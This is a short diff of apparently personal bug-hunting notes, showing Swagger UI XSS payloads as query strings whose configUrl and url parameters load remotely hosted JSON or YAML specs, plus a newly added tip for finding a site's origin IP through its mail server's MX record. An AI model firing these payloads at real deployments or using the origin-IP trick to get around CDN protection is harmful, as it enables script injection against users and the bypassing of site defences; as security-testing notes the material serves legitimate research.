@@ -113,3 +113,11 @@ find xss in swagger-ui with the following payloads
 ?configUrl=https://xss.smarpo.com/test.json&url=https://jumpy-floor.surge.sh/test.yaml
 ?configUrl=https://jumpy-floor.surge.sh/test.json
 ?url=https://jumpy-floor.surge.sh/test.yaml
+
+
+
+
+
+findig originIP:
+
+1.   check mx record (let the mail server send you a mail then inspect the mail) the mx record could be hosted on thesame ip of the main site.
